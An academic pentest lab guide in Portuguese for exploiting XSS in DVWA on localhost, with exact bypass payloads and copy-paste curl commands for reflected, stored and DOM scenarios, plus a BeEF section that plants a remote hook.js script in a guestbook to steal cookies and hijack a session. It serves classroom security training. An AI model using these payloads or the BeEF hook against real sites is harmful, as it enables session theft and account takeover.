UNIVERSIDADE REGIONAL DO NOROESTE DO ESTADO DO RIO GRANDE DO SUL — UNIJUÍ

Curso: [PREENCHER] · Disciplina: **Segurança de Dados** · Atividade: **Ferramentas de testes de intrusão (pentest)**

Integrantes: [PREENCHER] · Professor: Tiago Mallmann Rohde · Ijuí – RS, 2026

---

# Guia Passo a Passo — Exploração Manual de XSS no DVWA

> Documento operacional de apoio ao relatório técnico **DVWA e Cross-Site Scripting (XSS)**.

> **Escopo:** Laboratório acadêmico controlado. Ambiente DVWA isolado em `127.0.0.1:4280`, com autorização explícita do professor. Foco exclusivo em **Cross-Site Scripting (XSS)**. Exploração manual, incremental e discreta.

---

## 1. Pré-requisitos e Subida do Ambiente

### 1.1 Requisitos
- Docker + Docker Compose instalados.
- Navegador moderno (Chrome/Firefox) com DevTools.
- `curl` na linha de comando.
- (Opcional, seção 7) BeEF instalado.

### 1.2 Subir o container

```bash
docker compose up -d
```

Confirme que o serviço respondeu na porta correta (bind em `127.0.0.1:4280`):

```bash
docker compose ps
```

> **Nota (Windows/PowerShell):** os comandos `docker compose ...` e `curl` funcionam no PowerShell usando `curl.exe`. **Atenção:** o operador de continuação de linha do bash (barra invertida `\`) **não** funciona no PowerShell — por isso, neste guia, todo comando `curl` é apresentado em **uma única linha**. Caso prefira quebrar linhas no PowerShell, use a crase (`` ` ``) como caractere de continuação. Os exemplos multi-linha que aparecem na seção BeEF só funcionam em bash/Git-Bash.

### 1.3 Acessar e configurar o banco
1. Abra no navegador: `http://localhost:4280`
2. Você será redirecionado para a página de **Setup** (`/setup.php`).
3. Clique em **Create / Reset Database** no rodapé da página.
4. Aguarde a confirmação e a barra ser populada.

### 1.4 Login
- Acesse `http://localhost:4280/login.php`
- Usuário: `admin`
- Senha: `password`

> **Credenciais do banco (já auto-configuradas no container):** DB `dvwa`, usuário/senha `dvwa` / `p@ssw0rd`. Não é necessário alterá-las.

---

## 2. Como Obter os Cookies (PHPSESSID e security)

Os comandos `curl` precisam dos cookies de uma sessão **autenticada**.

### Via DevTools (recomendado)
1. Com o DVWA já logado, abra o DevTools (`F12`).
2. Vá em **Application** (Chrome) ou **Storage** (Firefox) → **Cookies** → `http://localhost:4280`.
3. Anote os dois valores:
   - `PHPSESSID` → ex.: `a1b2c3d4e5f6...`
   - `security` → `low`, `medium` ou `high`

### Via Console (alternativa rápida)
```javascript
document.cookie
```

> Em todos os comandos `curl` deste guia, **substitua** `<PHPSESSID>` pelo valor real do seu `PHPSESSID`. O valor do cookie `security` deve **coincidir** com o nível que você está testando.

---

## 3. Como Mudar o Nível de Segurança

1. No menu lateral, clique em **DVWA Security**.
2. No dropdown, selecione `Low`, `Medium`, `High` ou `Impossible`.
3. Clique em **Submit**.
4. Isso atualiza o cookie `security` automaticamente no navegador. Para o `curl`, ajuste o valor `security=` no parâmetro `-b` de acordo.

---

## 4. Os 9 Cenários de Exploração

> A matriz cobre **Reflected**, **Stored** e **DOM** nos níveis **low**, **medium** e **high**. Cada cenário traz: configuração, payload exato, entrega, resultado esperado e o print de evidência.

---

### REFLECTED XSS — `/vulnerabilities/xss_r/` (parâmetro GET `name`)

Reflexão em `<pre>Hello {name}</pre>`. Contexto: corpo HTML entre tags.

---

#### Cenário 1 — Reflected / Low
**Configuração:** DVWA Security = `Low`.

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
```
Ou digite o payload no campo *"What's your name?"* e submeta.

**Entrega (curl — evidência da reflexão crua):**
```bash
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<script>alert(document.cookie)</script>' -b 'PHPSESSID=<PHPSESSID>; security=low'
```

**Resultado esperado:** popup `alert()` exibindo `document.cookie` (PHPSESSID e security). No HTML do curl, a tag aparece literal: `<pre>Hello <script>alert(document.cookie)</script></pre>`.

**Por que funciona:** nenhum filtro. Concatenação direta de `$_GET['name']` no HTML, sem `htmlspecialchars()`. O header `X-XSS-Protection: 0` ainda desliga o filtro legado do navegador.

> **[PRINT 1]** Barra de endereços com a URL `?name=<script>...` + popup `alert()` mostrando o cookie. Opcional: DevTools → Elements com o nó `<script>` dentro do `<pre>`.

---

#### Cenário 2 — Reflected / Medium
**Configuração:** DVWA Security = `Medium`.

**Payload primário (vetor `<img>` sem a palavra `script`):**
```html
<img src=x onerror=alert(document.cookie)>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_r/?name=<img src=x onerror=alert(document.cookie)>
```

**Entrega (curl):**
```bash
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<img src=x onerror=alert(document.cookie)>' -b 'PHPSESSID=<PHPSESSID>; security=medium'
```

**Payloads alternativos (mesma falha):**
```html
<sCRipt>alert(document.cookie)</sCRipt>
<scr<script>ipt>alert(document.cookie)</scr<script>ipt>
```

**Resultado esperado:** imagem quebrada + popup `alert()` com o cookie.

**Por que funciona:** o filtro é `str_replace('<script>', '', ...)` — case-sensitive, passada única, só casa o literal exato `<script>`. O vetor primário `<img onerror>` não contém essa string e passa intacto.

> **Sobre o vetor aninhado (demonstração do mecanismo):** em `<scr<script>ipt>...`, a remoção do `<script>` central reconstrói um `<script>` válido de **abertura** na saída — e essa abertura reconstruída já basta para o parser iniciar a execução. Não dependa do `</scr<script>ipt>` reconstruir um `</script>` perfeito (a remoção do literal central não regenera de forma confiável a barra da tag de fechamento em todos os parsers); o disparo se apoia na abertura reconstruída. Use o vetor aninhado apenas para **ilustrar a reconstrução** da blacklist; para evidência limpa de execução, prefira o vetor primário `<img onerror>`.

> **[PRINT 2]** Popup `alert(document.cookie)` disparado pelo `onerror` do `<img>`. Opcional: lado a lado, a entrada `<scr<script>ipt>` e o HTML de saída já com o `<script>` de abertura reconstruído.

---

#### Cenário 3 — Reflected / High
**Configuração:** DVWA Security = `High`.

**Payload (vetor `<svg>` sem a palavra `script`):**
```html
<svg/onload=alert(document.cookie)>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_r/?name=<svg/onload=alert(document.cookie)>
```

**Entrega (curl):**
```bash
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<svg/onload=alert(document.cookie)>' -b 'PHPSESSID=<PHPSESSID>; security=high'
```

**Payload alternativo:**
```html
<img src=x onerror=alert(document.cookie)>
```

**Resultado esperado:** `onload` dispara o `alert()` automaticamente, sem interação.

**Por que funciona:** o filtro é `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', ...)` — remove apenas variações da palavra `script`. O `<svg/onload>` não contém as letras `s-c-r-i-p-t` nessa ordem, então passa intacto. O filtro ignora completamente event handlers e outras tags.

> **[PRINT 3]** Popup `alert(document.cookie)` disparado pelo `onload` do `<svg>`. Opcional: tentar `<script>alert(1)</script>` e mostrar no HTML que a regex o removeu, contrastando com o `<svg>` que sobreviveu.

---

### STORED XSS — `/vulnerabilities/xss_s/` (POST guestbook)

Campos: `txtName` (maxlength=10 client-side), `mtxMessage` (maxlength=50 client-side), botão `btnSign`. Sink: `Name: {name}<br />Message: {comment}<br />` sem encoding. O payload **persiste** e executa em toda visita.

> **Atenção:** `maxlength` é **só client-side**. `curl` e edição via DevTools o ignoram. O handler PHP exige `btnSign`, por isso todo `curl` inclui `btnSign=Sign Guestbook`.

---

#### Cenário 4 — Stored / Low
**Configuração:** DVWA Security = `Low`.

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Entrega (navegador):** no campo **Message** (textarea), cole o payload (cabe nos 50 chars) e clique em **Sign Guestbook**. Pelo campo **Name** seria necessário editar o `maxlength` (ver seção 5).

**Entrega (curl):**
```bash
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=low' --data-urlencode 'txtName=hax' --data-urlencode 'mtxMessage=<script>alert(document.cookie)</script>' --data-urlencode 'btnSign=Sign Guestbook'
```

**Resultado esperado:** ao salvar e a cada recarga de `/vulnerabilities/xss_s/`, dispara `alert()` com o cookie. Persiste para todos os visitantes.

**Por que funciona:** no nível Low **não há codificação de saída**. A rotina que monta o guestbook ecoa os campos *name* e *comment* **crus** no HTML (`htmlspecialchars()` só é aplicado no nível `impossible`). Como `<` e `>` não são convertidos em entidades, o `<script>` injetado é interpretado e executado pelo navegador.

> **[PRINT 4]** Popup `alert()` com `document.cookie` (security=low visível) sobre o Guestbook + DevTools → Elements mostrando o `<script>` dentro de `<div id="guestbook_comments">`.

---

#### Cenário 5 — Stored / Medium
**Configuração:** DVWA Security = `Medium`.

> O campo **Message** está blindado (`strip_tags` + `htmlspecialchars`). O elo fraco é o campo **Name** (`str_replace('<script>', '', ...)`).

**Payload (no campo Name):**
```html
<img src=x onerror=alert(1)>
```

**Entrega (curl — fura o maxlength do Name):**
```bash
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=medium' --data-urlencode 'txtName=<img src=x onerror=alert(1)>' --data-urlencode 'mtxMessage=ok' --data-urlencode 'btnSign=Sign Guestbook'
```

**Entrega (navegador):** edite o `maxlength` do campo Name via DevTools (seção 5), depois cole o payload e submeta.

**Resultado esperado:** a cada carga da página, o `<img>` falha e o `onerror` dispara `alert(1)`.

**Por que funciona:** `str_replace('<script>', ...)` é blacklist literal. O vetor `<img onerror>` não contém `<script>`, passa intacto. (O truque aninhado `<scr<script>ipt>` também furaria, mas `<img>` é mais limpo.)

> **[PRINT 5]** `alert(1)` na página + DevTools → Elements com `<img src=x onerror=alert(1)>` persistido no campo Name. Opcional: resposta curl HTTP 200 com a tag intacta.

---

#### Cenário 6 — Stored / High
**Configuração:** DVWA Security = `High`.

> Message segue blindado. Name é filtrado por regex que mira apenas `script`.

**Payload (no campo Name):**
```html
<svg/onload=alert(1)>
```

**Entrega (curl):**
```bash
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=high' --data-urlencode 'txtName=<svg/onload=alert(1)>' --data-urlencode 'mtxMessage=ok' --data-urlencode 'btnSign=Sign Guestbook'
```

**Entrega (navegador):** edite o `maxlength` do campo Name via DevTools (seção 5), cole o payload e submeta.

**Payloads equivalentes:**
```html
<img src=x onerror=alert(1)>
<body onpageshow=alert(1)>
```

**Resultado esperado:** a cada carga, o `<svg>` é parseado e o `onload` dispara `alert(1)`.

**Por que funciona:** `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', ...)` só remove a sequência `s-c-r-i-p-t`. O `<svg/onload>` não a contém. A barra `/` é separador válido entre tag e atributo.

> **[PRINT 6]** `alert(1)` com nível High ativo (cookie security=high) + DevTools → Elements com `<svg/onload=alert(1)>` persistido no Name.

---

### DOM-BASED XSS — `/vulnerabilities/xss_d/` (parâmetro GET `default`)

Sink **100% client-side**:
```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

> **Importante:** `curl` **não executa JavaScript**, então o `document.write` nunca roda. A execução ocorre **somente no navegador**. Os comandos curl abaixo servem apenas para confirmar o comportamento do servidor (HTTP 200, redireciona ou não).

---

#### Cenário 7 — DOM / Low
**Configuração:** DVWA Security = `Low`.

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```

**Entrega (curl — apenas confirma HTTP 200, NÃO executa):**
```bash
curl -s -b 'PHPSESSID=<PHPSESSID>; security=low' 'http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>'
```

**Resultado esperado:** dispara `alert()` com o cookie. O `<select>` de idiomas aparece quebrado.

**Por que funciona:** sem filtro. O payload entra cru em `var lang` e o `document.write` o injeta no DOM durante o parsing.

> **[PRINT 7]** Navegador com `alert(document.cookie)` aberto + URL `?default=<script>...` visível na barra.

---

#### Cenário 8 — DOM / Medium
**Configuração:** DVWA Security = `Medium`.

> Filtro server-side fraco: bloqueia apenas a substring `<script` (case-insensitive) e redireciona. Estamos dentro de `<select><option>`, então é preciso **fechar o contexto** antes do vetor.

**Payload:**
```html
</option></select><img src=x onerror=alert(document.cookie)>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(document.cookie)>
```

**Entrega (curl — confirma que NÃO há redirect; não executa):**
```bash
curl -s -b 'PHPSESSID=<PHPSESSID>; security=medium' 'http://localhost:4280/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(document.cookie)>'
```

**Resultado esperado:** dispara `alert(document.cookie)`. Para comparação, `?default=<script>...` seria redirecionado para `?default=English` (bloqueado).

**Por que funciona:** o `stripos()` só procura `<script`. O payload usa `<img onerror>` (sem `<script>`) e `</option></select>` quebra o contexto do `<select>` para que o `<img>` seja parseado como elemento válido.

> **[PRINT 8]** Dois estados: (1) URL com `<script>` redirecionando para `?default=English` (bloqueada); (2) URL com `<img ... onerror>` disparando o `alert` (bypass).

---

#### Cenário 9 — DOM / High
**Configuração:** DVWA Security = `High`.

> Whitelist server-side: aceita só `French`, `English`, `German`, `Spanish`; o resto redireciona. **Mas** o sink lê `location.href` inteira, e o **fragmento `#`** nunca é enviado ao servidor.

**Payload:**
```html
English#<script>alert(document.cookie)</script>
```

**Entrega (URL no navegador):**
```
http://localhost:4280/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>
```

**Entrega (curl — servidor só vê `default=English`; não executa):**
```bash
curl -s -b 'PHPSESSID=<PHPSESSID>; security=high' 'http://localhost:4280/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>'
```

**Resultado esperado:** a página carrega normalmente (servidor vê `English`, não redireciona) e dispara o `alert()`. Sem o `#`, o conteúdo seria redirecionado.

**Por que funciona:** `$_GET['default']` vale apenas `English` (válido na whitelist), pois o fragmento após `#` não trafega para o servidor (RFC 3986). Mas o JavaScript lê `location.href` **inteira**, capturando o `<script>` do fragmento. Defesa server-side é estruturalmente incapaz de proteger um sink que não depende dela.

> **Troubleshooting:** se o `alert` **não** disparar, abra o Console (`F12`) e inspecione `location.href`. Navegadores modernos podem aplicar **percent-encoding** ao fragmento, fazendo o `<script>` chegar como `English#%3Cscript%3Ealert(document.cookie)%3C/script%3E`. Nesse caso o `decodeURI()` do sink **não** desfaz `%3C`/`%3E` (somente `decodeURIComponent` o faria), e o vetor não executa. Mantenha `English#<script>alert(document.cookie)</script>` como a solução esperada do DVWA; se necessário, force a navegação digitando/colando a URL diretamente na barra de endereços (em vez de seguir um link) para reduzir a re-codificação automática.

> **[PRINT 9]** Barra de endereços com `?default=English#<script>...` + `alert` aberto. Opcional: aba **Network** do DevTools mostrando que a requisição contém apenas `default=English` (sem o fragmento), provando que o servidor nunca viu o payload.

---

## 5. Bloco DevTools — Editar `maxlength` e usar o Console

Os campos do guestbook têm `maxlength` **apenas client-side**. Para colar payloads longos diretamente no navegador:

### Remover/editar maxlength via Elements
1. Abra DevTools (`F12`) → aba **Elements**.
2. Selecione o campo (ícone de seleção ou `Ctrl+Shift+C`, clique no input).
3. Clique no atributo `maxlength="10"` e altere para um valor alto (ex.: `500`) ou **delete** o atributo.
4. Cole o payload no campo e submeta.

### Editar maxlength via Console
```javascript
// Campo Name (txtName)
document.querySelector('[name="txtName"]').maxLength = 1000;

// Campo Message (mtxMessage)
document.querySelector('[name="mtxMessage"]').maxLength = 1000;
```

### Inspecionar a injeção
```javascript
// Ver o HTML renderizado do guestbook (Stored)
document.getElementById('guestbook_comments').innerHTML;

// Ver os cookies acessíveis ao JS (demonstra ausência de HttpOnly)
document.cookie;
```

---

## 6. Bloco curl — Comandos Prontos (copia-cola)

> Substitua `<PHPSESSID>` pelo seu valor real e ajuste `security=` ao nível testado.
> **Windows/PowerShell:** cada comando abaixo está em **uma única linha**, pronto para colar no PowerShell (usa `curl.exe`). **Não** insira a barra invertida (`\`) de continuação do bash — ela não funciona no PowerShell. Se quiser quebrar em várias linhas no PowerShell, use a crase (`` ` ``) ao final de cada linha.

### Reflected
```bash
# Low
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<script>alert(document.cookie)</script>' -b 'PHPSESSID=<PHPSESSID>; security=low'

# Medium
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<img src=x onerror=alert(document.cookie)>' -b 'PHPSESSID=<PHPSESSID>; security=medium'

# High
curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' --data-urlencode 'name=<svg/onload=alert(document.cookie)>' -b 'PHPSESSID=<PHPSESSID>; security=high'
```

### Stored (POST do guestbook — fura o maxlength client-side)
```bash
# Low
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=low' --data-urlencode 'txtName=hax' --data-urlencode 'mtxMessage=<script>alert(document.cookie)</script>' --data-urlencode 'btnSign=Sign Guestbook'

# Medium (payload no campo Name)
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=medium' --data-urlencode 'txtName=<img src=x onerror=alert(1)>' --data-urlencode 'mtxMessage=ok' --data-urlencode 'btnSign=Sign Guestbook'

# High (payload no campo Name)
curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=high' --data-urlencode 'txtName=<svg/onload=alert(1)>' --data-urlencode 'mtxMessage=ok' --data-urlencode 'btnSign=Sign Guestbook'
```

### DOM (apenas confirmam o comportamento do servidor — execução só no navegador)
```bash
# Low
curl -s -b 'PHPSESSID=<PHPSESSID>; security=low' 'http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>'

# Medium
curl -s -b 'PHPSESSID=<PHPSESSID>; security=medium' 'http://localhost:4280/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(document.cookie)>'

# High (servidor recebe apenas default=English; o fragmento # não trafega)
curl -s -b 'PHPSESSID=<PHPSESSID>; security=high' 'http://localhost:4280/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>'
```

---

## 7. Bloco BeEF — Hook via Stored Low e Sequestro de Sessão

> **AVISO DE USO ÉTICO:** Execute **somente** neste laboratório DVWA controlado, isolado (`127.0.0.1`) e com autorização explícita do professor. **Jamais** contra sistemas de terceiros.

### 7.1 Subir o BeEF
No diretório do framework:
```bash
./beef
```

> **Nota de SO:** `./beef` assume Linux/macOS ou Git-Bash. No Windows nativo, inicie o BeEF conforme a instalação utilizada (por exemplo, via WSL/Git-Bash). Os exemplos `curl` multi-linha desta seção usam a barra invertida (`\`) de continuação do **bash** — em PowerShell, use a versão de **linha única** (como no bloco 6) ou substitua a barra invertida pela crase (`` ` ``).

O BeEF expõe:
- Painel: `http://<IP>:3000/ui/panel`
- Hook script: `http://<IP>:3000/hook.js`

> Use o `<IP>` da máquina BeEF que seja acessível ao navegador-vítima (porta padrão `3000`).

### 7.2 Injetar o hook no guestbook (Stored Low, via curl)
O `maxlength` é só client-side, então o `curl` entrega o payload completo (comando em uma linha, compatível com PowerShell):
```bash
curl -s 'http://localhost:4280/vulnerabilities/xss_s/' -b 'PHPSESSID=<PHPSESSID>; security=low' --data-urlencode 'txtName=lab' --data-urlencode 'mtxMessage=<script src="http://<IP>:3000/hook.js"></script>' --data-urlencode 'btnSign=Sign Guestbook'
```

### 7.3 Disparar e confirmar o hook
1. No navegador-vítima (autenticado no DVWA), abra `http://localhost:4280/vulnerabilities/xss_s/`.
2. O payload armazenado carrega o `hook.js` automaticamente.
3. No painel BeEF, o navegador aparece como **online/hooked** na árvore **Hooked Browsers**, com fingerprint do browser e sessão.

### 7.4 Módulo de impacto — captura de cookies e sequestro
1. Selecione o navegador hooked → aba **Commands**.
2. Execute **Host → Get Cookies** para capturar os cookies acessíveis (PHPSESSID/security, se sem `HttpOnly`).
3. Reimporte o `PHPSESSID` capturado em outro navegador → assuma a sessão autenticada da vítima **sem senha** (session hijacking).

> **Conclusão didática:** o impacto só é possível pela ausência de output encoding, de CSP e da flag `HttpOnly` no nível Low.

---

## 8. Tabela Final de Mapeamento — Capturas → PRINT do Relatório

> **Economia de páginas:** capture os 9 cenários individualmente, mas **monte 3 imagens compostas** (uma por tipo, com os 3 níveis lado a lado) para o relatório. O relatório usa apenas `[PRINT 1]`, `[PRINT 2]` e `[PRINT 3]`.

| PRINT (relatório) | Capturas a montar | Tipo | Evidência-chave | Seção do relatório |
|---|---|---|---|---|
| **[PRINT 1]** | Cenários 1+2+3 (Low/Medium/High) | Reflected | `alert(document.cookie)` via `<script>`, `<img onerror>` e `<svg onload>` | 5 — Reflected (`xss_r`) |
| **[PRINT 2]** | Cenários 4+5+6 (Low/Medium/High) | Stored | `<script>` persistido + `<img>`/`<svg>` no campo Name | 5 — Stored (`xss_s`) |
| **[PRINT 3]** | Cenários 7+8+9 (Low/Medium/High) | DOM | `document.write`, quebra de contexto e fragmento `#` | 5 — DOM-based (`xss_d`) |
| (opcional) | Seção 7 (BeEF) | Stored→BeEF | Browser hooked + Get Cookies + hijack | 6.1 — Impacto (BeEF) |

> Os marcadores `[PRINT 1..9]` nos cenários acima indicam **o que capturar em cada passo**; eles se consolidam nos 3 prints compostos da tabela. A captura da Seção 7 (BeEF) é opcional e reforça a seção de impacto.

---

> **Higiene do laboratório:** ao final, limpe o guestbook (botão **Clear Guestbook** ou reset do banco na página Setup) e retorne o nível para `Impossible` para evidenciar a mitigação correta. No DVWA, o nível `Impossible` combina **três defesas XSS**: (1) **codificação de saída** com `htmlspecialchars()` aplicada tanto na entrada quanto na renderização dos campos; (2) **token anti-CSRF** validado a cada submissão; e (3) no DOM, **remoção do `decodeURI`** (a whitelist passa a tratar o valor já codificado, sem revertê-lo). Esse conjunto neutraliza Reflected, Stored e DOM XSS — sem necessidade de citar mecanismos fora do escopo de XSS.